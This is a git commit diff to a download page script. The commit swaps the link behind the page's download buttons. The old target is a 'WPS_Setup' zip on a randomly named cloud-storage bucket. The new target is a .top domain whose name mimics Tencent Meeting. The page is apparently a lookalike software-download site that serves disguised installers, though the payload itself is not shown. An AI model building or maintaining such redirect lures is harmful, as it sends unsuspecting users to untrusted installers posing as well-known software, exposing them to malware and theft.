da0f09316fed3157284478d09369bd7d4d115de1
mmnbby815-sudo <mmnbby815@gmail.com>
2025-09-08 10:29:51 +0800

    Update download.js

--- static/js/download.js
+++ static/js/download.js
@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://ss33fowrwerioss.s3.us-east-005.backblazeb2.com/WPS_Setup_21915.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://tengxunhuiyihloadu.top/"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
